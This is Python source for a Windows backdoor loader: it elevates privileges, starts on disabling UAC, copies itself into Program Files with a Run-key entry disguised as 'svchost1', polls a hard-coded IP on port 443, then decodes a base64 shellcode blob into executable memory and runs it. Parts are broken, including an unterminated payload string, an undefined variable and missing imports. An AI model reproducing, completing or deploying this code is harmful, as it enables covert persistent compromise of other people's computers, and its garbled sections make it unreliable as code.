from subprocess import Popen, SW_HIDE, STARTUPINFO, STARTF_USESHOWWINDOW
from elevate import elevate
from multiprocessing import Process
from winreg import *
from shutil import copyfile
from time import sleep
import socket
import ctypes
import base64
import sys
import os

kernel32 = ctypes.windll.kernel32

def ShellCodeBackdoor1():

	global buf
	global shellcode

	safe_ = "SDHJSIHpH////0iNBe////9Iu4tQjqIA9xkYSDFYJ0gt+P///+L0w2FH6oEePed0r8YvBRjm53QYNdf3fdP70S0H6jGvPlCghrhwopihrwgiwoghw098gwlTjkdt0qxuAtNTasYbxUj9jOyYJxO/l8dnoJ5t6kC9ysgKQVftVq3R+ApDiCBRg1QEs1gcXkJ/DprVCUkwnUXl1eZAte4j+DtrOXqy+DPjJ2s7pX5UeLD2oqWSSezhPEWwuiAKXOlm928HUJ9sjsq1rBMy2dl2ZhjseLLZ0glcagK+AyYBdzpLpwU5pPkNETdMqAsHii8o1gG9YHtiMpt6xTfln1g68ZrFPJqt4MVdnJEyrUMLcYwRuBee6HeaISvRddZmPQvdwK2dyj59YU3ApuLzCBEzAJpl+IZtNhzGvY3mvRHdsfdafFB4VYGwjCaUTCAV6/CMLet71YuWkNFPmOBzXpZ78QbvOw+1O0Tuhi23uhfu2ifh0LO30FSCTbenVcH8GUkppiY4NJAkSsRkiqu8zC3AV6bsu8HVZJtjBx/h9p9qzneGZ/l2He1LBYYvfD3pAgMEVuyx5dnuCihgbbijboiencwboivwwbi987x89a7dEUtxhhf5jp1fSyqGSPnMnV1LMIZJ+cudUEsrhlX5zZ1VSyuGXvnLnUpLTYY9+ZudMEtzhlf5vp1US02GEfmpnRRLY4YS+YmdXUt
	buf = base64.b64decode(code_bytes)

	return buf

def write_memory(buf):
	length = len(buf)

	kernel32.VirtualAlloc.restype = ctypes.c_void_p

	kernel32.RtlMoveMemory.argtypes = (
		ctypes.c_void_p,
		ctypes.c_void_p,
		ctypes.c_size_t
	)

	ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
	kernel32.RtlMoveMemory(ptr, buf, length)

	return ptr

def run(shellcode):
	buffer = ctypes.create_string_buffer(shellcode)

	ptr = write_memory(buffer)

	shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))

	shell_func()

def check_connection(server_ip, server_port):
	while True:
		sock = None

		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			res_ = sock.connect_ex(( server_ip, server_port ))

			if res_ == 0:
				#print("EXCELLENT", res_)

				sleep(3)

				sock.close()
				sock = None

				sleep(8)

				process2 = Process( target = recursive_run )
				process2.start()
				process2.join()

				return False
			else:
				#print("NO connection")

				sleep(3)

				sock.close()
				sock = None

				sleep(5)

		except Exception as warning_:

			try:
				sock.close()
				sock = None
			except Exception as ClosedSocked_:
				#print(ClosedSocked_)
				sleep(5)

			#print(warning_)
			sleep(5)

def recursive_run():
	shellcode = ShellCodeBackdoor1()
	run(shellcode)

def AUTORUN_configuration():
	mainDisk = str(getenv("SystemDrive"))
	path1 = mainDisk + "\\Program Files\\" + argv[0].split("\\")[-1]

	key2 = OpenKeyEx(HKEY_LOCAL_MACHINE,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
		0, KEY_ALL_ACCESS | KEY_WOW64_64KEY)

	if not os.path.exists(path1):
		copyfile(sys.argv[ 0 ], path1)

		try:
			data2, index2 = QueryValueEx(key2, "svchost1")
		except FileNotFoundError:

			SetValueEx(key2, "svchost1", 0, REG_SZ, path1)

			CloseKey(key2)
	else:
		try:
            data3, index3 = QueryValueEx(key2, "svchost1")
        except FileNotFoundError:

        	SetValueEx(key2, "svchost1", 0, REG_SZ, path1)

        	CloseKey(key2)

        CloseKey(key2)

def Disable_UAC():
	key1 = OpenKeyEx(HKEY_LOCAL_MACHINE, 

		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 

		0, KEY_ALL_ACCESS | KEY_WOW64_64KEY)

    data1, index1 = QueryValueEx(key1, "EnableLUA")

    if str(data1) == "1":
        pass
    else:
        pass

    CloseKey(key1)

#FINISH HERE , DISABLE UAC ! DONT FORGET!

def main():
	try:
		elevate()

		Disable_UAC()
		AUTORUN_configuration()

		process1 = Process( target = check_connection, args=("185.65.200.96", 443) )

		process1.start()

		process1.join()

	except Exception as mainError_:
		raise SystemExit

if __name__ == '__main__':
	main()
